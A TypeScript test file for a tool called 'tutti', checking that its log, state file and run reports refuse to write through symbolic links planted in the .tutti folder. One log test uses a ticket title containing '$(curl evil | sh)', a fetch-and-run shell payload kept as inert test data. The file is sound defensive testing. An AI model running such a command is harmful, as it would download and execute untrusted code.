// The run's own files in the main checkout's .tutti/ (the log, state.json, the reports) are written
// through the symlink guard (§ 9.1). A merged ticket can leave a symbolic link where one was, or at
// a folder of theirs: git replaces an ignored file with a committed link. Each is refused rather
// than written through, and the file the link points at is left as it was.
import { describe, expect, test } from "bun:test"
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { BunFileSystem } from "@effect/platform-bun"
import { Effect, Exit, Layer } from "effect"
import { TestClock } from "effect/testing"
import { NotAFileRefused, SymlinkRefused, writeFileUnder } from "../src/native/libc.ts"
import { OrganCost } from "../src/organs/OrganCost.ts"
import { OrganHold, Organs } from "../src/organs/Organs.ts"
import { makePrinter, type Out } from "../src/print/organLine.ts"
import { Ending } from "../src/print/summary.ts"
import { Ledger } from "../src/run/ledger.ts"
import { reportName } from "../src/run/localTime.ts"
import { Log, line, logFile } from "../src/run/log.ts"
import { type ReportRun, reportsDir, runReport } from "../src/run/report.ts"
import { Store, StoreWriteFailed, stateFile } from "../src/services/Store.ts"
import { appConfig, layer as configLayer } from "../src/testing/AppConfig.ts"
import { layer as attentionLayer } from "../src/testing/Attention.ts"
import { layer as beadsLayer } from "../src/testing/Beads.ts"
import { layer as eventsLayer } from "../src/testing/EventStream.ts"
import { layer as gitLayer, Repository } from "../src/testing/Git.ts"
import { layer as logLayer, texts } from "../src/testing/Log.ts"
import { layer as cannedLayer } from "../src/testing/Organs.ts"
import { makeTheme, orchestra } from "../src/ui/theme.ts"

/** A main checkout, and a folder outside it with a file a link can point at. */
const places = () => {
  const repo = realpathSync(mkdtempSync(join(tmpdir(), "tutti-links-")))
  const outside = realpathSync(mkdtempSync(join(tmpdir(), "tutti-links-outside-")))
  const target = join(outside, ".zshrc")
  writeFileSync(target, "export PATH=/usr/bin\n")
  return { repo, outside, target }
}

const untouched = (outside: string, target: string) => {
  expect(readFileSync(target, "utf8")).toBe("export PATH=/usr/bin\n")
  expect(readdirSync(outside)).toEqual([".zshrc"])
}

const failureOf = <A, E>(exit: Exit.Exit<A, E>): E => {
  if (Exit.isSuccess(exit)) throw new Error("expected a failure")
  const reason = exit.cause.reasons.find((r) => r._tag === "Fail")
  if (reason === undefined) throw new Error(`expected a typed failure, got ${exit.cause}`)
  return reason.error
}

describe("writeFileUnder", () => {
  test("writes a new file whole, and replaces one there keeping its mode", async () => {
    const { repo } = places()
    mkdirSync(join(repo, "a"))
    await Effect.runPromise(writeFileUnder(repo, "a/f.txt", "one\n", 0o600))
    expect(readFileSync(join(repo, "a/f.txt"), "utf8")).toBe("one\n")
    expect(statSync(join(repo, "a/f.txt")).mode & 0o777).toBe(0o600)
    await Effect.runPromise(writeFileUnder(repo, "a/f.txt", new TextEncoder().encode("two\n")))
    expect(readFileSync(join(repo, "a/f.txt"), "utf8")).toBe("two\n")
    expect(statSync(join(repo, "a/f.txt")).mode & 0o777).toBe(0o600)
    expect(readdirSync(join(repo, "a"))).toEqual(["f.txt"])
  })

  test("refuses a link at the file's name, leaving the link and its target as they were", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, "a"))
    symlinkSync(target, join(repo, "a/f.txt"))
    const error = failureOf(await Effect.runPromiseExit(writeFileUnder(repo, "a/f.txt", "$(x)\n")))
    expect(error).toBeInstanceOf(SymlinkRefused)
    expect((error as SymlinkRefused).component).toBe("a/f.txt")
    expect(lstatSync(join(repo, "a/f.txt")).isSymbolicLink()).toBe(true)
    expect(readdirSync(join(repo, "a"))).toEqual(["f.txt"])
    untouched(outside, target)
  })

  test("refuses a link at a folder on the way, making nothing through it", async () => {
    const { repo, outside, target } = places()
    symlinkSync(outside, join(repo, "a"))
    const error = failureOf(await Effect.runPromiseExit(writeFileUnder(repo, "a/f.txt", "x\n")))
    expect(error).toBeInstanceOf(SymlinkRefused)
    expect((error as SymlinkRefused).component).toBe("a")
    untouched(outside, target)
  })

  test("refuses a folder at the file's name", async () => {
    const { repo } = places()
    mkdirSync(join(repo, "a/f.txt"), { recursive: true })
    const error = failureOf(await Effect.runPromiseExit(writeFileUnder(repo, "a/f.txt", "x\n")))
    expect(error).toBeInstanceOf(NotAFileRefused)
    expect(readdirSync(join(repo, "a"))).toEqual(["f.txt"])
  })
})

describe("the log", () => {
  const opened = (repo: string) =>
    Effect.runPromiseExit(
      Effect.gen(function* () {
        yield* (yield* Log).write(line`a ticket titled ${"$(curl evil | sh)"}`)
      }).pipe(Effect.provide(Log.layer({ repo }))),
    )

  test("makes .tutti and appends to tutti.log in it", async () => {
    const { repo } = places()
    expect(Exit.isSuccess(await opened(repo))).toBe(true)
    expect(readFileSync(join(repo, logFile), "utf8")).toContain("a ticket titled $(curl evil | sh)")
  })

  test("refuses a link at .tutti/tutti.log, and nothing is appended to its target", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, ".tutti"))
    symlinkSync(target, join(repo, logFile))
    const error = failureOf(await opened(repo))
    expect(error).toBeInstanceOf(SymlinkRefused)
    expect((error as SymlinkRefused).component).toBe(logFile)
    untouched(outside, target)
  })

  test("refuses a link at .tutti", async () => {
    const { repo, outside, target } = places()
    symlinkSync(outside, join(repo, ".tutti"))
    const error = failureOf(await opened(repo))
    expect(error).toBeInstanceOf(SymlinkRefused)
    expect((error as SymlinkRefused).component).toBe(".tutti")
    untouched(outside, target)
  })
})

describe("state.json", () => {
  const run = { pid: 4242, started: "2026-10-23T08:31:00Z", version: "0.1.0" }
  const session = { session: "s-1", worktree: "/w/demo-1", branch: "tutti/demo-1" }
  const saved = (repo: string) =>
    Effect.runPromiseExit(
      Effect.flatMap(Store, (store) => store.saveSession("demo-1", session)).pipe(
        Effect.provide(Store.layer({ repo, run }).pipe(Layer.provide(BunFileSystem.layer))),
      ),
    )

  test("is written below .tutti/run, made where it is missing", async () => {
    const { repo } = places()
    expect(Exit.isSuccess(await saved(repo))).toBe(true)
    expect(readFileSync(join(repo, stateFile), "utf8")).toContain('"demo-1"')
  })

  test("a link at state.json is StoreWriteFailed, and its target is left as it was", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, ".tutti/run"), { recursive: true })
    // A link to a file that isn't there yet: reading the state finds none.
    symlinkSync(join(outside, "new"), join(repo, stateFile))
    const error = failureOf(await saved(repo))
    expect(error).toBeInstanceOf(StoreWriteFailed)
    expect((error as StoreWriteFailed).reason).toContain("is a symbolic link")
    expect(lstatSync(join(repo, stateFile)).isSymbolicLink()).toBe(true)
    untouched(outside, target)
  })

  test("a link at .tutti/run is StoreWriteFailed, and nothing is made through it", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, ".tutti"))
    symlinkSync(outside, join(repo, ".tutti/run"))
    const error = failureOf(await saved(repo))
    expect(error).toBeInstanceOf(StoreWriteFailed)
    expect((error as StoreWriteFailed).reason).toContain(".tutti/run is a symbolic link")
    untouched(outside, target)
  })
})

describe("the run report", () => {
  const theme = makeTheme(orchestra, { appearance: "dark", depth: "truecolor", noColor: true })

  /** Runs the report of an empty run in `repo`; gives the log and what was printed. */
  const reported = async (repo: string) => {
    const printed: Array<string> = []
    const out: Out = { write: (text) => printed.push(text), columns: () => 100, tty: false }
    const deps = Layer.mergeAll(
      cannedLayer({ reviewer: { report: "Nothing was left to do.\n" } }, []),
      configLayer(appConfig({}, repo)),
      beadsLayer([]),
      gitLayer({ dir: repo }),
      Layer.succeed(OrganHold, { held: Effect.succeed(false) }),
    ).pipe(Layer.provideMerge(Layer.mergeAll(logLayer(), eventsLayer())))
    const services = Layer.mergeAll(
      Organs.layer,
      OrganCost.layer,
      Ledger.layer,
      attentionLayer(() => ({ _tag: "Deny" })),
    ).pipe(Layer.provideMerge(deps))
    const lines = await Effect.runPromise(
      Effect.gen(function* () {
        const run: ReportRun = {
          started: 0,
          base: "main",
          startHead: yield* (yield* Repository).head("main"),
          ending: Ending.Done({
            text: "READY_EMPTY: nothing left",
            tickets: 0,
            limit: null,
            took: 0,
          }),
          exitCode: 0,
          quit: false,
        }
        yield* runReport(
          run,
          Effect.succeed({ printer: makePrinter(out, theme), theme, width: 100 }),
        )
        return yield* texts
      }).pipe(Effect.provide(services), Effect.provide(TestClock.layer())),
    )
    return { lines, printed: printed.join("") }
  }

  test("is saved below .tutti/reports, made where it is missing", async () => {
    const { repo } = places()
    const { lines } = await reported(repo)
    expect(lines).toContain(`REPORT: written to ${reportsDir}/${reportName(0)}`)
    expect(readdirSync(join(repo, reportsDir))).toEqual([reportName(0)])
  })

  test("isn't saved through a link at .tutti/reports, which the log says", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, ".tutti"))
    symlinkSync(outside, join(repo, reportsDir))
    const { lines, printed } = await reported(repo)
    const said = `report not saved: ${reportsDir}/${reportName(0)} under ${repo}: ${reportsDir} is a symbolic link`
    expect(lines).toContain(said)
    expect(printed).toContain("Report not saved:")
    untouched(outside, target)
  })

  test("isn't saved through a link at its own name", async () => {
    const { repo, outside, target } = places()
    mkdirSync(join(repo, reportsDir), { recursive: true })
    symlinkSync(target, join(repo, reportsDir, reportName(0)))
    const { lines } = await reported(repo)
    expect(lines.some((l) => l.includes("report not saved:"))).toBe(true)
    expect(existsSync(join(repo, reportsDir, reportName(0)))).toBe(true)
    untouched(outside, target)
  })
})
